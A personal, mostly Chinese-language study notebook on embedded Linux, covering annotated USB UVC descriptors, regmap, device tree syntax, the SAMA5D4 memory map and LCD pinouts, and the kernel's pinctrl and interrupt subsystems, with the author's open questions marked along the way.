		bControlSize	3	//The size of the bmControls is 3 bytes
		bmControls    0x000000	//No controls are supported
	/* Class-specific Output Terminal Descriptor */ 输出终端
		bLength		0x9	//这个descriptor长度(包括bLength) 这里占9字节	
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE 接口类 descriptor
		bDescriptorSubtype 0x03	//descriptor 的子标记 0x02 ->VC_OUTPUT_TERMINAl 这是视频控制接口 的 输出控制端模块
	**	bTerminalID 	0x02	//这个模块 的 id为 2	
		wTerminalType	0x0101	///表示是输出控制端模块 控制的是 usb streaming输出 (TT_STREAMING)
		bAssocTerminal	0	//No association 不知道干什么用的
	**	bSourceID	1	//表示这个 输出模块的 输入源是 id=1的模块,即 上面的 camera input terminal 模块
		iTerminal	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
		//至此 VideoControl Interface (视频控制接口)的内容都由
		//	VideoControl Interface Descriptor
		//	|-Class-specific Interface header Descriptor about VC
		//	|-Class-specific Input Terminal Descriptor about Camera 
		//	|-Class-specific Output Terminal Descriptor
		//这几个 descriptor 描述完毕
		//当中,这里应该还有一个pu模块,然后才可以使用 uvc 命令,后面再处理!!
	/* VideoStreaming Interface Descriptor (VS) */
		bLength		0x9	//这个descriptor长度(包括bLength) 这里占9字节			
		bDescriptorType	0x04	//descriptor 的标记,0x04 表明这个是 INTERFACE接口 的 descriptor
	**	bInterfaceNumber 0x01	//这个接口的id是1,也是 上述 VC header->baInterfaceNr(1)中指向的 接口id
	**	bAlternateSetting 0x0	//这个 VideoStreaming Interface Descriptor 的 也归类到 id=0 的Alternatesetting 里的一个子项
*********	bNumEndpoints	0	//这个接口使用多少端口, 这里使用0个,既然要输出数据应该有个非0端口吧,为什么说没有???重点!!!
		bInterfaceClass 0x0e	//表示接口 到的 class 是 CC_video ,接口属于 视频类
		bInterfaceSubClass 0x02	//表示接口 分到 CC_video 的 SC_VIDEOSTREAMING subclass里, 接口是视频类的视频流子类
					//即这是一个视频控制接口!!
	**	bInterfaceProtocol 0x0  //空置,没有用到,必须设为 0x0 表示PC_PROTOCOL_UNDEFINED
		iInterface	0	//id=0表示没有指向对应 string descriptor, 没有附加的备注信息
	/* Class-specific Interface header Descriptor about VS */
		bLength		0x0e	//这个descriptor长度(包括bLength) 这里占13字节	
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
*********	bDescriptorSubType 0x01	//descriptor 的子标记,0x01表明是 接口类 的 VS_input_header descriptor	???
	**	bNumFormats 	0x01	//有 1 个视频流格式 format descriptor  
		wTotalLength	??	//整个 videocontrol interface class 内容的所占总字节数,即整个SC_VIDEOCONTROL子类具体内容所占总字节数
					//包括:
					//	当前的 header descriptor,
					//	,
					//	,
*********	bEndpointAddress ox80	//用于实时传输流数据的 端点的id=0x82,为啥demo上是0x80,有这个非零端点,为啥上面说没有endpoints?
		bmInfo			//No dynamic format change supported
		bTerminalLink	2	//VideoStreaming interface 要连到 模块id=2的 output terminal 
		bStillCaptureMethod 0   //0 means -- still image capture method not support
		bTriggerSupport		//not support trigger
		bTriggerUsage	0	//no Trigger Usage
		bControlSize	1	//The size of the bmControls is 1 bytes
		bmControls    	0x00	//No No VideoStreaming specific controls are supported
	/* Class-specific VS Format Descriptor */
		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节	
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
		bDescriptorSubtype 0x04	//descriptor 的子标记,0x04 表明是VS_FORMAT_uncompressed 即原始格式视频流
		bFormatIndex	0x01	//这个format id=1
		bNumFrameDescriptors 3  //这个format 有三种frame格式,即有三种 frame descriptor
		guidFormat	??	//guid yuy2 的编码,不知道是啥,但是因为是 VS_FORMAT_uncompressed 所以有这个成员
		bBitsPerPixel	16	//16bit perpixel 也是因为是 VS_FORMAT_uncompressed 的关系
		bDefaultFrameIndex 2	//默认使用哪个frame_2格式
		bAspectRatioX	0	// Non-interlaced stream – not required
		bAspectRatioY	0	// Non-interlaced stream – not required
		bmInterlaceFlags 0	// Non-interlaced stream
		bCopyProtect	0	//No restrictions imposed on the duplication of this video stream.
	/* Class-specific VS Frame Descriptor 320x240 */
		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
		bDescriptorSubtype 0x05	//descriptor 的子标记,0x04 表明是VS_FRAME_uncompressed 即原始格式视频流		
		bFormatIndex	0x01	//这个frame id=1
		bmCapabilities 0	//Still images using capture method not supported
		wWidth		320	//帧宽
		wHeight		240	//帧高
		dwMinBitRate	320*240*2*12    //视频流传输时,最小传输字节率 12张图片/s的字节率
		dwMaxBitRate	320*240*2*30  	//视频流传输时,最大传输字节率 30张图片/s的字节率
		dwMaxVideoFrameBufSize  320*240*2	//最大视频流缓存,一帧图片大小的数据的缓存
		dwDefaultFrameInterval	0x000A2C2A	//默认帧与帧间的传输间隔: 0x000A2C2A=666666ns 即约莫15帧每秒
		bFrameIntervalType	1	//从多个传输间隔中选取一个使用,这里选用dwFrameInterval[] 中第一个帧与帧间的传输间隔 ,
		dwFrameInterval[]	0x000A2C2A,0x000A2C25 ....	//FrameInterval数值列,列出多个可用传输间隔!!
	/* Class-specific VS Frame Descriptor 640x480 */
		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
		bDescriptorSubtype 0x05	//descriptor 的子标记,0x04 表明是VS_FRAME_uncompressed 即原始格式视频流		
		bFormatIndex	0x02	//这个frame id=2
		bmCapabilities 0	//Still images using capture method not supported
		wWidth		640	//帧宽
		wHeight		480	//帧高
		dwMinBitRate	640*480*2*12    //视频流传输时,最小传输字节率 12张图片/s的字节率
		dwMaxBitRate	640*480*2*30  	//视频流传输时,最大传输字节率 30张图片/s的字节率
		dwMaxVideoFrameBufSize  640*480*2	//最大视频流缓存,一帧图片大小的数据的缓存
		dwDefaultFrameInterval	0x000A2C2A	//默认帧与帧间的传输间隔: 0x000A2C2A=666666ns 即约莫15帧每秒
		bFrameIntervalType	1	//从多个传输间隔中选取一个使用,这里选用dwFrameInterval[] 中第一个帧与帧间的传输间隔 ,
		dwFrameInterval[]	0x000A2C2A,0x000A2C25 ....	//FrameInterval数值列,列出多个可用传输间隔!!		
	/* Class-specific VS Frame Descriptor 176x144 */
		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
		bDescriptorSubtype 0x05	//descriptor 的子标记,0x04 表明是VS_FRAME_uncompressed 即原始格式视频流		
		bFormatIndex	0x03	//这个frame id=3
		bmCapabilities 0	//Still images using capture method not supported
		wWidth		176	//帧宽
		wHeight		144	//帧高
		dwMinBitRate	176*144*2*12    //视频流传输时,最小传输字节率 12张图片/s的字节率
		dwMaxBitRate	176*144*2*30  	//视频流传输时,最大传输字节率 30张图片/s的字节率
		dwMaxVideoFrameBufSize  176*144*2	//最大视频流缓存,一帧图片大小的数据的缓存
		dwDefaultFrameInterval	0x000A2C2A	//默认帧与帧间的传输间隔: 0x000A2C2A=666666ns 即约莫15帧每秒
		bFrameIntervalType	1	//从多个传输间隔中选取一个使用,这里选用dwFrameInterval[] 中第一个帧与帧间的传输间隔 ,
		dwFrameInterval[]	0x000A2C2A,0x000A2C25 ....	//FrameInterval数值列,列出多个可用传输间隔!!
	/* Class-specific color matching Descriptor */
		bLength		??	//这个descriptor长度(包括bLength) 这里占??字节			
		bDescriptorType 0x24	//descriptor 的标记,0x24 表明这个是 CS_INTERFACE (Class-specific Interface) 接口类 descriptor
		bDescriptorSubtype 0x0d	//descriptor 的子标记,0x04 表明是VS_colorformat 即原始格式视频流	
		bColorprimaries 1	//BT.700, sRGB    ???
		bTranfercharacteristics 1	



?????????
 VBLANK: 显示器扫描线完成最后一行后,需要重返左上角,这个过程叫做: vblank,也叫VBI(vertical blank interval) ,因为扫描线变得blank,以防止看到一个斜线显示在屏幕上.?????
开机没有出现小企鹅问题!!
开发板的中断号与linux中断号的兑换表!!		 

使用 bitbake 工具链???
	另外,如何 更改内核配置!!! 而bitbake 又可以通过!!!
	
























































////////////////////////////// regmap 模块概念
3.0linux内核版本中，codec driver是直接调用i2c的i2c_master_send函数与i2c_transfer函数来实现i2c的读写，
3.3版本，codec driver通过调用snd_soc_read和snd_soc_write函数来实现i2c的读写，
	这两个函数内部包裹了codec->read和codec->write，而codec->read和codec->write的赋值是在snd_soc_codec_set_cache_io中，
	最终也是调用了i2c_master_send函数与i2c_transfer函数
3.10版本开始出现了regmap的接口，这个regmap将i2c、spi、mmio、irq都抽象出统一的接口regmap_read、regmap_write、regmap_update_bits等接口
例如对于i2c接口
devm_regmap_init_i2c(i2c, &regmap_i2c);或者使用
devm_regmap_init(&i2c->dev, &regmap_i2c, &i2c->dev, config)
|
devm_regmap_init(struct device *dev, struct regmap_bus *bus, void *bus_content, struct regmap_config *config);
1）注册方法regmap_bus和对象i2c：
通过把struct regmap_bus regmap_i2c和i2c->dev注册到regmap模块中去，而regmap_bus中已经实现了read和write函数（调用的就是i2c_master_send与i2c_transfer）
2）使用注册的对象和方法
当调用regmap_read或者regmap_write的时候，这两个函数会取出struct regmap中的content即i2c，并调用之前注册的regmap_bus中的read和write函数来实现读和写。
regmap_update_bit内部调用了regmap_read和regmap_write
我觉得以上的原理挺重要的，我们可以自己实现类似的接口：提供注册的机制，能够将对象以及对象的方法注册进去；当需要调用的时候，取出对应的对象和方法。










////////////////////////////// linux 4.1 流程
但是在某个platform设备的设备信息被 device_add 到platferm总线上时，platform设备会执行probe，


setup+_arch->setup_arch->unflatten_device_tree (将DTB二进制文件转换成节点是device_node的树状结构)


板级初始化前，先挂载安装各种 bus设备（包括platform—bus设备）到linux上，
然后挂载各种设备驱动信息到 对应的总线设备上，挂载各个platform设备的驱动信息到 platform总线上

板级初始化：（重的说，从dtb处获得 各platform设备的设备信息内容，注册platform设备的设备信息到 platform总线上）
sama5_dt_device_init DT_MACHINE_START(sama5_dt, "Atmel SAMA5")：.init_machine
	at91_soc_init	//得到 soc，信息
	soc_device_to_device
	of_platform_populate(NULL, of_default_bus_match_table, NULL, soc_dev);		//应该只注册platform设备信息到 platform总线上
		of_find_node_by_path("/")
		of_platform_bus_create
			of_get_property(bus, "compatible", NULL)
			auxdata = of_dev_lookup(lookup, bus);
			of_device_is_compatible(bus, "arm,primecell")			//比较compatible
			of_amba_device_create(bus, bus_id, platform_data, parent);	//amba还是属于注册platform设备信息到 platform总线上）
				dev = amba_device_alloc(NULL, 0, 0);
					amba_device_initialize(dev, name);	
						device_initialize(&dev->dev);		//device_initialize	
				irq_of_parse_and_map
				ret = of_address_to_resource(node, 0, &dev->res);
					addrp = of_get_address(dev, index, &size, &flags);
					__of_address_to_resource(dev, addrp, size, flags, name, r);
						taddr = of_translate_address(dev, addrp);
						port = pci_address_to_pio(taddr);
				ret = amba_device_add(dev, &iomem_resource);
					ret = request_resource(parent, &dev->res);
					ret = amba_get_enable_pclk(dev);
					amba_put_disable_pclk(dev);
					ret = device_add(&dev->dev);		//device_add（还是属于注册platform设备信息到 platform总线上）
			dev = of_platform_device_create_pdata(bus, bus_id, platform_data, parent);
				dev = of_device_alloc(np, bus_id, parent);
					dev = platform_device_alloc("", -1);
					。。。
				of_dma_configure(&dev->dev, dev->dev.of_node);
				int of_device_add(struct platform_device *ofdev)
					device_add(&ofdev->dev)				//device_add
			for_each_child_of_node(bus, child) {
				rc = of_platform_bus_create(child, matches, lookup, &dev->dev, strict);
			of_node_set_flag(bus, OF_POPULATED_BUS);
		of_node_set_flag
		of_node_put
	at91sam9x5_pm_init	//这里是启动电源
		at91_dt_ramc();
		at91_pm_init();
		at91_pmc_fast_startup_init();
	
总的来说，板级初始化的 显性做法就是 把platform设备的设备信息挂到 platform总线上
但是在某个platform设备的设备信息被 device_add 到platferm总线上时，platform设备会执行probe，


 	
platform设备会执行probe，probe会把对应的具体设备的设备信息，挂入对应子系统的bus设备，
诱发bus：match，诱发具体设备驱动probe，初始化具体设备驱动 注册并挂载设备到linux上！！

例如 i2c-platform设备的probe
static int at91_twi_probe(struct platform_device *pdev)		//i2c_at91.c
	rc = i2c_add_numbered_adapter(&dev->adapter);
		__i2c_add_numbered_adapter
			i2c_register_adapter
				{ dev_set_name(&adap->dev, "i2c-%d", adap->nr);
				adap->dev.bus = &i2c_bus_type;
				adap->dev.type = &i2c_adapter_type;
				res = device_register(&adap->dev);  }	//把i2c adapter的设备信息 挂入 i2c bus
				bri->recover_bus--int (*recover_bus)(struct i2c_adapter *)	//从dtb中读取 具体其他外接从设备信息 挂入 i2c bus
					//只有一个指针，实际函数在哪还不知道！！
	
	
	
	
	
例如 spi-platform设备的probe	
static int atmel_spi_probe(struct platform_device *pdev)	//Spi_atmel.c
	int devm_spi_register_master(struct device *dev, struct spi_master *master)
		ret = spi_register_master(master);	
			status = of_spi_register_master(master);	//从dtb得到一些信息
			{ dev_set_name(&master->dev, "spi%u", master->bus_num);
			status = device_add(&master->dev); }		//把spi master设备信息 挂入 spi bus
			of_register_spi_devices(master);		//从dtb中读取 具体其他外接从设备信息 挂入 spi bus
	
	
	
	
注意到，对于芯片的所有功能模块，指定子系统的 platform设备只是一个桥接的左右，并没有实际操作算法！！！
而实际访问控制芯片寄存器的api 是又 主机设备提供的，
例如i2c adapter spi master 才是真正操作芯片寄存器的挂载在linux上的设备
而其他外接功能芯片的设备是通过有组织调用 主机设备的操作函数的 “虚拟”设备而已	

主机设备与万能设备的区别？？
看到主机设备的 device_register,但是没看到主机设备的 driver_register？
主机设备是platform设备本身，还是另外靠xx bus match后初始化的另一个设备？？



注意：of_xxxx_put()或者xxxx_put()是卸载未完全加载的 模块



////////////////////////////// dts学习

关于旧版内核板级信息,与新版dts的对比:
	http://blog.csdn.net/sinat_26600745/article/details/47345257 


基本知识
http://blog.csdn.net/21cnbao/article/details/8457546

1,
#address-cells
#size-cells
描述子节点级的可寻址的 reg变量数量
例如:
{
	#address-cells = <3>;	//表示 reg 有3个address内容
	#size-cells = <2>;	//表示 reg 有2个size内容
	a@0 {
		device_type = "cpu";
		compatible = "arm,cortex-a5";
		reg = <1 78 0x67 88 1023 >;	//1,78,0x67为3个address内容, 88,1023为2个size内容
		next-level-cache = <&L2>;
	};
};

2,
interrupt-parent
interrupts =
interrupt-controller
/*遍历所有的node，寻找定义了interrupt-controller属性的node，如果定义了interrupt-controller属性则说明该node就是一个中断控制器。*/
interrupt controller的处理
初始化是通过start_kernel->init_IRQ->machine_desc->init_irq()实现的


http://www.cnblogs.com/aaronLinux/p/5496559.html

例子:
http://www.cnblogs.com/aaronLinux/p/5551441.html
此篇源文件arch/arm/boot/dts/imx6sx.dtsi
uart5: serial@021f4000 {
    compatible = "fsl,imx6sx-uart",
                "fsl,imx6q-uart", "fsl,imx21-uart";
    reg = <0x021f4000 0x4000>;
    interrupts = <GIC_SPI 30 IRQ_TYPE_LEVEL_HIGH>;
    clocks = <&clks IMX6SX_CLK_UART_IPG>,
            <&clks IMX6SX_CLK_UART_SERIAL>;
    clock-names = "ipg", "per";
    dmas = <&sdma 33 4 0>, <&sdma 34 4 0>;
    dma-names = "rx", "tx";
    status = "disabled";
};
以上这段代码更多出现在*.dtsi中
如uart5作为该外设的label，node-name@unit-address作为设备的名称，node-name只是设备类型，
	uart1/uart2/uart3等可以都是serial名称，而@后面则跟着设备寄存器起始地址。
interrupts对应的中断号和中断出发方式，uart5的父节点为aips2，而aips2的父节点为soc，soc节点定义了interrupt-parent = <&intc>;
	给出了节点所依附的中断控制器，如果节点没有指定interrupt-parent，那么就从父节点继承，所以该uart5节点继承了soc的中断控制器，即intc. 
	而intc节点的#interrupt-cells = <3>;所以就有了该节点中interrupts = <GIC_SPI 30 IRQ_TYPE_LEVEL_HIGH>;三个字段，
	具体这三个字段的含义可以参考芯片文档的描述。其中GIC_SPI定义在include/dt-bindings/interrupt-controller/arm-gic.h值为0，　
clock外设时钟，在include/dt-bindings/clock/imx6sx-clock.h，指定设备工作时钟
status一般会设为disabled。
&uart5 {
    pinctrl-names = "default";
    pinctrl-0 = <&pinctrl_uart5>;
    fsl,uart-has-rtscts;
    status = "okay";
};
以上这段代码更多出现在*.dts中
注：如果看过内核/arch/arm/boot/dts目录的读者看到这可能有一个疑问。在每个.dsti和.dts中都会存在一个“/”根节点，
	那么如果在一个设备树文件中include一个.dtsi文件，那么岂不是存在多个“/”根节点了么。
	其实不然，编译器DTC在对.dts进行编译生成dtb时，会对node进行合并操作，最终生成的dtb只有一个root node。
	Dtc会进行合并操作这一点从属性上也可以得到验证。这个稍后做讲解。
在*.dts中如果想对该设备进行操作，需要进行override，至少status需要从disabled设置为okay, 
	当然也有可能需要对compatible属性进行重写(为了和自己的driver匹配)，另外需要使用&label首先引用该设备，
使用pinctrl-names和pinctrl-0进行引脚的配置，当然这里可能出现多组引脚的配置，例如:
&usdhc3 {
    pinctrl-names = "default", "state_100mhz", "state_200mhz";
    pinctrl-0 = <&pinctrl_usdhc3>;
    pinctrl-1 = <&pinctrl_usdhc3_100mhz>;
    pinctrl-2 = <&pinctrl_usdhc3_200mhz>;
    bus-width = <8>;
    cd-gpios = <&gpio2 10 GPIO_ACTIVE_HIGH>;
    wp-gpios = <&gpio2 15 GPIO_ACTIVE_HIGH>;
    keep-power-in-suspend;
    enable-sdio-wakeup;
    vmmc-supply = <&vcc_sd3>;
    status = "okay";
};

pinctrl_usdhc3: usdhc3grp {
    fsl,pins = <
        MX6SX_PAD_SD3_CMD__USDHC3_CMD        0x17069
        MX6SX_PAD_SD3_CLK__USDHC3_CLK        0x10071
        MX6SX_PAD_SD3_DATA0__USDHC3_DATA0    0x17069
        MX6SX_PAD_SD3_DATA1__USDHC3_DATA1    0x17069
        MX6SX_PAD_SD3_DATA2__USDHC3_DATA2    0x17069
        MX6SX_PAD_SD3_DATA3__USDHC3_DATA3    0x17069
        MX6SX_PAD_SD3_DATA4__USDHC3_DATA4    0x17069
        MX6SX_PAD_SD3_DATA5__USDHC3_DATA5    0x17069
        MX6SX_PAD_SD3_DATA6__USDHC3_DATA6    0x17069
        MX6SX_PAD_SD3_DATA7__USDHC3_DATA7    0x17069
        MX6SX_PAD_KEY_COL0__GPIO2_IO_10        0x17059 /* CD */
        MX6SX_PAD_KEY_ROW0__GPIO2_IO_15        0x17059 /* WP */
        >;
};
这种pinctrl的设置可参照/Documentation/devicetree/bindinsg/pinctrl下示例代码













////////////////////////////// sama5d4 mmap 结构

/*
 * Internal Memory.		//
 */
#define ATMEL_BASE_ROM		0x00000000	片上rom始地址
#define ATMEL_BASE_NFC		0x00100000	片上SRAM始地址
#define ATMEL_BASE_SRAM		0x00200000	第二块片上ROM始地址,
#define ATMEL_BASE_VDEC		0x00300000	/* Video Decoder Controller */
#define ATMEL_BASE_UDPHS_FIFO	0x00400000	/* USB Device HS controller */
#define ATMEL_BASE_OHCI		0x00500000	/* USB Host controller (OHCI) */
#define ATMEL_BASE_EHCI		0x00600000	/* USB Host controller (EHCI) */
#define ATMEL_BASE_AXI		0x00700000
#define ATMEL_BASE_DAP		0x00800000
#define ATMEL_BASE_SMD		0x00900000

/*
 * External memory
 */
#define ATMEL_BASE_CS0		0x10000000
#define ATMEL_BASE_DDRCS	0x20000000
#define ATMEL_BASE_CS1		0x60000000
#define ATMEL_BASE_CS2		0x70000000
#define ATMEL_BASE_CS3		0x80000000






////////////////////////////// TFT_lcd

SAMA5D4 : default lcd 接口  (对应RGB88的,注意,物理接口不能其他兼容RGBXXX,详细看pdf)
1:	EDBG_ID_01		ID_SYS not connect
2:	GND
3:	LCD_DAT0_PA0		LCDDAT0 	Blue	
5:	LCD_DAT0_PA1		LCDDAT1 
5:	LCD_DAT0_PA2		LCDDAT2 
6:	LCD_DAT0_PA3		LCDDAT3
7:	GND
8:	LCD_DAT0_PA4		LCDDAT4 	
9:	LCD_DAT0_PA5		LCDDAT5 
10:	LCD_DAT0_PA6		LCDDAT6 
11:	LCD_DAT0_PA7		LCDDAT7
12:	GND
13:	LCD_DAT0_PA8		LCDDAT8		GREEN
14:	LCD_DAT0_PA9		LCDDAT9 
15:	LCD_DAT0_PA10		LCDDAT10 
16:	LCD_DAT0_PA11		LCDDAT11
17:	GND
18:	LCD_DAT0_PA12		LCDDAT12	
19:	LCD_DAT0_PA13		LCDDAT13
20:	LCD_DAT0_PA14		LCDDAT14 
21:	LCD_DAT0_PA15		LCDDAT15
22:	GND
23:	LCD_DAT0_PA16		LCDDAT16	RED
24:	LCD_DAT0_PA17		LCDDAT17
25:	LCD_DAT0_PA18		LCDDAT18 
26:	LCD_DAT0_PA19		LCDDAT19
27:	GND
28:	LCD_DAT0_PA20		LCDDAT20
29:	LCD_DAT0_PA21		LCDDAT21
30:	LCD_DAT0_PA22		LCDDAT22 
31:	LCD_DAT0_PA23		LCDDAT23
32:	GND
33:	LCD_PCK_PA28		LCDPCK
34:	LCD_VSYNC_PA26		LCDVSYNC
35:	LCD_HSYNC_PA27		LCDHSYNc 
36:	LCD_DEN_PA29		LCDDEN
37:	AD3_YM_PC30		YM 即 Y- 是并联到GND的一端
38:	AD2_YP_PC29		YP 即 Y+ 是并联到VCC的一端
39:	AD1_XM_PC28		XM 即 X- 是并联到GND的一端
40:	AD0_XP_PC27		XP 即 X+ 是并联到VCC的一端
41:	LCD_DISP_PA25		LCDDISP
42:	LCD_TWD0_PA30		not connect
43:	LCD_TWCK0_PA31		not connect
44:	LCD_PE9			IRQ1 not connect
45:	LCD_PE10		IRQ2 not connect
46:	LCD_PWM_PA24		not connect
47:	NRST_3V3		not connect
48:	VCC_5V
50:	GND

裸屏!!
1:	VLED-		LED Ground	//另外接 TPS61040 模块
2:	VLED+		LED Power
3:	DGND		Digital Ground
4:	VCC		Power Supply (+3.3 V)
5:	R0		Red Data Bit0
6:	R1		Red Data Bit1
7:	R2		Red Data Bit2
8:	R3		Red Data Bit3
9:	R4		Red Data Bit4
10:	R5		Red Data Bit5
11:	R6		Red Data Bit6
12:	R7		Red Data Bit7
13:	G0		Green Data Bit0
14:	G1		Green Data Bit1
15:	G2		Green Data Bit2
16:	G3		Green Data Bit3
17:	G4		Green Data Bit4
18:	G5		Green Data Bit5
19:	G6		Green Data Bit6
20:	G7		Green Data Bit7
21:	B0		Blue Data Bit0
22:	B1		Blue Data Bit1
23:	B2		Blue Data Bit2
24:	B3		Blue Data Bit3
25:	B4		Blue Data Bit4
26:	B5		Blue Data Bit5
27:	B6		Blue Data Bit6
28:	B7		Blue Data Bit7
29:	DGND		Digital Ground
30:	DCLK		Dot Data Clock
31:	DISP		Display On/Off		Usually pull high. High: Display On / Low: Display Off
32:	Hsync		Horizontal Sync Input
33:	Vsync		Vertical Sync Input
34:	DE		Data Enable Control	DE=” H “: data can be access, DE=” L “: data cannot be access
35:	N.C		N.C
36:	DGND		Digital Ground
37:	X-		触摸控制
38:	Y-		触摸控制
39:	X+		触摸控制
40:	Y+		触摸控制

XPT2046触摸控制芯片,
ssd1960 单片机mcu 与 lcd裸屏 之间的转接芯片,(一般单片机本身没有lcd控制模块时才去使用有转接芯片的方案)

adc touchscreen page1537


////////////////////////////// linux 启动流程




arch/arm/kernel/head.s: _INIT

init/main.c:  asmlinkage __visible void __init start_kernel(void)






////////////////////////////// linux 启动流程
at91Tbootstep会把全局物理地址 0x40000 (nandflash空间)的0x80000字节内容拷到全局物理地址 0x26f00000 (对应ram空间)去,
就是uboot内容
uboot从 arch/arm/lib/veters.s -> _start -> b reset
-> arch\arm\cpu\armv7\start.S:reset -> 



////////////////////////////// linux 

kset kobject :
kobject 是抽象的通用数据结构,每一个linux内容 例如 device信息,drive信息 等等,都分得一个通用数据,主要用于内容的引用计数,
当linux内容没有使用时,引用计数为0,linux内容会删除,kobject会从系统释放,
kset是一个特殊的kobject 指向内容是一个许多kobject指针的链表
kset 与 kobject 的关系就像 文件夹 和 文件,但文件夹本身是一个有列表信息的文件
每个 kobject kset  在sys/里都有响应的文件夹,而 kobject 的 attrs属性内容以文件的形式存在这些文件夹里





#define ACCESS_ONCE(x) (*(volatile typeof(x) *)&(x))
owner = ACCESS_ONCE(lock->owner); //ACCESS_ONCE表示一定要从实际内存地址访问这个变量lock->owner,不要被优化,不要从cpu_cache缓存里读出而不访问内存












GPIO 通用相关:
pin control subsystem的文件列表

1、源文件列表

我们整理linux/drivers/pinctrl目录下pin control subsystem的源文件列表如下：
文件名 	描述
core.c core.h 	pin control subsystem的core driver
pinctrl-utils.c pinctrl-utils.h 	pin control subsystem的一些utility接口函数
pinmux.c pinmux.h 	pin control subsystem的core driver(pin muxing部分的代码，也称为pinmux driver)
pinconf.c pinconf.h 	pin control subsystem的core driver(pin config部分的代码，也称为pin config driver)
devicetree.c devicetree.h 	pin control subsystem的device tree代码
pinctrl-xxxx.c 	各种pin controller的low level driver
在pin controller driver文档中 ，我们以2416的pin controller为例，描述了一个具体的low level的driver，这个driver涉及的文件包括pinctrl-samsung.c，pinctrl-samsung.h和pinctrl-s3c24xx.c。

2、和其他内核模块接口头文件
很多内核的其他模块需要用到pin control subsystem的服务，这些头文件就定义了pin control subsystem的外部接口以及相关的数据结构。我们整理linux/include/linux/pinctrl目录下pin control subsystem的外部接口头文件列表如下：
文件名 	描述
consumer.h 	其他的driver要使用pin control subsystem的下列接口：
a、设置引脚复用功能
b、配置引脚的电气特性
这时候需要include这个头文件
devinfo.h 	这是for linux内核的驱动模型模块（driver model）使用的接口。struct device中包括了一个struct dev_pin_info    *pins的成员，这个成员描述了该设备的引脚的初始状态信息，在probe之前，driver model中的core driver在调用driver的probe函数之前会先设定pin state
machine.h 	和machine模块的接口。

3、Low level pin controller driver接口
我们整理linux/include/linux/pinctrl目录下pin control subsystem提供给底层specific pin controller driver的头文件列表如下：
文件名 	描述
pinconf-generic.h 	这个接口主要是提供给各种pin controller driver使用的，不是外部接口。
pinconf.h 	pin configuration 接口
pinctrl-state.h 	pin control state状态定义
pinmux.h 	pin mux function接口 











device tree 与gpio 设置:
    device-node-name { 
            定义该device自己的属性  

            pinctrl-names = "sleep", "active";－－－－－－（1）
            pinctrl-0 = <pin-config-0-a>;－－－－－－－－－－－－－－（2）
            pinctrl-1 = <pin-config-1-a pin-config-1-b>;        
        };

 （1）pinctrl-names定义了一个state列表。那么什么是state呢？具体说应该是pin state，对于一个client device，它使用了一组pin，这一组pin应该同时处于某种状态，毕竟这些pin是属于一个具体的设备功能。state的定义和电源管理关系比较紧密，例如当设备active的时候，我们需要pin controller将相关的一组pin设定为具体的设备功能，而当设备进入sleep状态的时候，需要pin controller将相关的一组pin设定为普通GPIO，并精确的控制GPIO状态以便节省系统的功耗。state有两种，标识，一种就是pinctrl-names定义的字符串列表，另外一种就是ID。ID从0开始，依次加一。根据例子中的定义，state ID等于0（名字是active）的state对应pinctrl-0属性，state ID等于1（名字是idle）的state对应pinctrl-1属性。具体设备state的定义和各个设备相关，具体参考在自己的device bind。 
（2）pinctrl-x的定义。pinctrl-x是一个句柄（phandle）列表，每个句柄指向一个pin configuration。有时候，一个state对应多个pin configure。例如在active的时候，I2C功能有两种配置，一种是从pin ID{7,8}引出，另外一个是从pin ID{69,103}引出。 

serial@50000000 { 
        ……
        pinctrl-names = "default";
        pinctrl-0 = <0x2 0x3>;
    }; 
该serial device只定义了一个state就是default，对应pinctrl-0属性定义。pinctrl-0是一个句柄（phandle）列表，每个句柄指向一个pin configuration。0x2对应上节中的uart0-data节点，0x03对应uart0-fctl 节点，也就是说，这个串口有两种配置，一种是从gph bank中的第一个和第二个GPIO pin引出，另外一个是从gph bank中的第8个和第9个GPIO pin引出。

（5）一个pin configuration的device tree node被解析成两个描述符，一个是samsung pin group的描述符，另外一个是samsung pin mux function描述符。这两个描述符的名字都是根据dts file中的pin configuration的device node name生成，只不过pin group的名字附加-grp的后缀，而function描述符的名字后面附加-mux的后缀。 
    struct of_device_id
    {
        char    name[32];－－－－－－要匹配的device node的名字
        char    type[32];－－－－－－－要匹配的device node的类型
        char    compatible[128];－－－匹配字符串（DT compatible string），用来匹配适合的device node
        const void *data;－－－－－－－－对于GIC，这里是初始化函数指针
    };

这个数据结构主要被用来进行Device node和driver模块进行匹配用的。从该数据结构的定义可以看出，在匹配过程中，device name、device type和DT compatible string都是考虑的因素。更细节的内容请参考__of_device_is_compatible函数。 












Linux kernel的中断子系统 gic模块
gic控制所有中断,外部中断先通过gic distributor 选择由哪一个cpu处理这次这个中断行为,然后通过cpu interface 传递到中断该cpu当前运作,让其执行这次中断任务!!!!!
中断虽然发生了，但软件不一定立刻响应，可能由于在内核态执行的某些操作不希望被外部事件打断而主动关闭了中断（或是关闭了CPU的中断，或者MASK了该IRQ number），这时候，中断信号没有立刻得到响应，软件仍然在内核态执行低优先级任务系统调用的代码。

2.6内核和2.4内核显著的不同是提供了一个CONFIG_PREEMPT的选项，打开该选项后，linux kernel就支持了内核代码的抢占（当然不能在临界区）
所谓抢占式就是中断任务处理完后,重新调度,而不是回到之前被打断的进程
 （1）为了同步，内核中总有些代码需要持有自旋锁资源，或者显式的调用preempt_disable来禁止抢占，这时候不允许抢占 
 （2）中断上下文（并非只是中断handler，还包括softirq、timer、tasklet）总是可以抢占进程上下文 
